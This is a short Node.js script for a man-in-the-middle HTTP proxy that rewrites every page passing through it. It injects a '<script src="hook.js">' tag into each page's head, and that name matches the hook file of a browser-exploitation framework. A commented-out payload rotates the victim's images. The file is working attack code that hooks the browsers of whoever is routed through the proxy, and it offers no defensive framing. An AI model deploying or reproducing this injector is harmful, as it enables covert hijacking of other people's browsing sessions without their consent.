'use strict';

var http = require('http'),
    https = require('https'),
    connect = require('connect'),
    httpProxy = require('http-proxy'),
    harmon = require('harmon'),
    url = require('url'),

    // Payloads
    // Rotate pics
    // TO_INJECT = '<style type="text/css"> img { -webkit-transform: rotate(-90deg)' +
    //             '; -moz-transform: rotate(-90deg); filter: progid:DXImageTransform' +
    //             '.Microsoft.BasicImage(rotation=3);}</style>',
    TO_INJECT = '<script src="hook.js"></script>',

    selects = [],
    simpleselect = {},

    app, proxy;


simpleselect.query = 'head';
simpleselect.func = function (node) {
    var stm = node.createStream(),
        tag = '';

    // collect all the data in the stream
    stm.on('data', function (data) {
        tag += data;
    });

    // Once finished we can add out stuff
    stm.on('end', function () {
        process.stdout.write('tag:   ' + tag + '\n');
        process.stdout.write('end:   ' + node.name + '\n');

        // Now on the write side of the stream write some data using .end()
        stm.end(tag + TO_INJECT);
    });

};

selects.push(simpleselect);

// Basic Connect App
app = connect();

proxy = httpProxy.createProxy({
    // secure: false,
    // hostRewrite: true,
    // autoRewrite: true,
    // protocolRewrite: true
    // xfwd : true
});


//Additional true parameter can be used to ignore js and css files.
// app.use(harmon([], selects, true));
app.use(harmon([], selects));

app.use(
    function (req, res) {
        var finalUrl = req.url,
        // var finalUrl = 'https://nodejs.org',
        // var finalUrl = 'http://google.com',
        // var finalUrl = 'https://google.com',
            finalAgent = null,
            parsedUrl = url.parse(finalUrl);

        if (parsedUrl.protocol === 'https:') {
            finalAgent = https.globalAgent;
        } else {
            finalAgent = http.globalAgent;
        }
        console.log('URLLLLL');
        console.log(finalUrl);
        console.log('RESSSSSSS');
        // console.log(res);

        // console.log(parsedUrl);
        proxy.on('error', function (err) {
            console.log('ERRORRR');
            console.log(err);
        });

        proxy.web(req, res, {
            target: finalUrl,
            // target: finalUrl,
            agent: finalAgent,
            headers: { host: parsedUrl.hostname }
            // xfwd : true,
            // secure: false,
            // hostRewrite: true,
            // autoRewrite: true,
            // BREAKS THE URL CORE MODULE, TODO: RESEARCH
            // protocolRewrite: true
        });
        // proxy.close();
    }
);

http.createServer(app).listen(8000);
